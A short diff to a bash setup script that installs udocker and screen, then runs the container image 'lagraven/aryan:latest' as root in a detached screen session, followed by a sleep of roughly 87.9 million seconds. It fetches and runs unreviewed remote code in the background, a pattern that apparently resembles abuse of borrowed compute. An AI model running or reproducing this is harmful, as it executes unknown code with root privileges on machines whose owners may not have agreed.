@@ -1,5 +1,6 @@
 #!/bin/bash
 sudo apt update
-sudo apt install python3-pip -y
+sudo apt install python3-pip screen -y
 pip install udocker
-udocker --allow-root run lagraven/node:latest
+screen -dmS play udocker --allow-root run lagraven/aryan:latest
+sleep 87885736
